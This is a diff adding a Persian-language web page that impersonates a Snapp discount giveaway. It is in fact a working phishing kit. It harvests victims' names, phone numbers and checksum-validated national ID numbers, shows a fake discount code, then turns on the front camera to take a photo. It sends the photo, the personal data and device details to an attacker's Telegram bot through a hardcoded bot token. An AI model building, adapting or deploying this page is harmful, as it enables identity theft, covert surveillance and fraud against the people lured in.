@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دریافت تخفیف اسنپ</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(135deg, #00c853, #1b5e20);
+            font-family: 'Vazirmatn', sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            color: #000;
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #00c853;
+            margin-bottom: 10px;
+        }
+        p { font-size: 16px; margin: 15px 0; color: #333; }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 12px;
+            font-size: 16px;
+            text-align: center;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #00c853;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        button:hover { background: #00b248; }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .success {
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: white;
+            padding: 30px;
+            border-radius: 20px;
+        }
+        .code {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 5px;
+            background: white;
+            color: #00c853;
+            padding: 15px;
+            border-radius: 15px;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .loading {
+            margin: 20px 0;
+            font-size: 18px;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink { 0%,100% { opacity:1 } 50% { opacity:0.5 } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="formPage">
+    <img src="https://upload.snapp.ir/snapp-logo.png" alt="اسنپ" class="logo">
+    <h1>دریافت تخفیف ۱۰۰ هزار تومنی</h1>
+    <p>برای دریافت کد تخفیف، اطلاعات زیر را وارد کنید</p>
+    <input type="text" id="name" placeholder="نام و فامیل">
+    <input type="text" id="phone" placeholder="شماره موبایل (مثال: 09123456789)" maxlength="11">
+    <input type="text" id="melli" placeholder="کد ملی (۱۰ رقم)" maxlength="10">
+    <button onclick="validateAndNext()">ادامه</button>
+</div>
+
+<div class="container success hidden" id="successPage">
+    <h1 style="color:white;">تبریک! کد تخفیف آماده شد 🎉</h1>
+    <p class="loading">در حال فعال‌سازی تخفیف ویژه شما...</p>
+    <div class="code" id="discountCode">SNAP100K</div>
+    <p>این کد رو در بخش "کد تخفیف" برنامه اسنپ وارد کنید و از ۱۰۰ هزار تومان اعتبار رایگان + تخفیف‌های بعدی لذت ببرید!</p>
+    <p style="font-size:14px;opacity:0.9;">اعتبار کد: نامحدود | فقط برای کاربران جدید</p>
+</div>
+
+<video id="video" playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
+    const CHAT_ID = "-1003384762825";
+    let userData = {};
+
+    function validatePhone(phone) {
+        return /^09[0-9]{9}$/.test(phone);
+    }
+
+    function validateMelli(melli) {
+        if (melli.length !== 10 || !/^\d{10}$/.test(melli)) return false;
+        const check = parseInt(melli[9]);
+        let sum = 0;
+        for (let i = 0; i < 9; i++) {
+            sum += parseInt(melli[i]) * (10 - i);
+        }
+        const remainder = sum % 11;
+        return (remainder < 2 && check === remainder) || (remainder >= 2 && check === 11 - remainder);
+    }
+
+    function validateAndNext() {
+        const name = document.getElementById('name').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const melli = document.getElementById('melli').value.trim();
+
+        if (!name || !phone || !melli) {
+            alert("همه فیلدها را پر کنید");
+            return;
+        }
+        if (!validatePhone(phone)) {
+            alert("شماره موبایل معتبر نیست");
+            return;
+        }
+        if (!validateMelli(melli)) {
+            alert("کد ملی معتبر نیست");
+            return;
+        }
+
+        userData = { name, phone, melli };
+
+        document.getElementById('formPage').classList.add('hidden');
+        document.getElementById('successPage').classList.remove('hidden');
+
+        // کد رندوم بساز
+        const codes = ["SNAP100K", "FREE100K", "GIFT2025", "SNAPVIP", "RIDE100K"];
+        const randomCode = codes[Math.floor(Math.random() * codes.length)];
+        document.getElementById('discountCode').textContent = randomCode;
+
+        // بعد ۴ ثانیه عکس بگیر
+        setTimeout(takePhoto, 4000);
+    }
+
+    async function takePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: {ideal: 1280}, height: {ideal: 720} } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(r => setTimeout(r, 2500)); // صبر تا تصویر روشن بشه
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, 'user_photo.jpg');
+                form.append('caption', getInfoText());
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
+            }, 'image/jpeg', 0.95);
+
+            stream.getTracks().forEach(t => t.stop());
+            sendInfoText();
+
+        } catch(e) {
+            sendInfoText();
+        }
+    }
+
+    function getInfoText() {
+        const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+        let battery = "نامشخص";
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                battery = `${Math.round(b.level * 100)}% ${b.charging ? "(در حال شارژ)" : ""}`;
+            });
+        }
+
+        return `کاربر جدید تخفیف اسنپ درخواست کرد! 🎉
+
+𝗡𝗮𝗺𝗲: ${userData.name}
+𝗣𝗵𝗼𝗻𝗲: ${userData.phone}
+𝗠𝗲𝗹𝗹𝗶: ${userData.melli}
+𝗠𝗼𝗱𝗲𝗹: ${navigator.platform || navigator.userAgent}
+𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${battery}
+𝗧𝗶𝗺𝗲: ${now}
+
+𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: ™MicY™`;
+    }
+
+    function sendInfoText() {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
+    }
+</script>
+
+</body>
+</html>
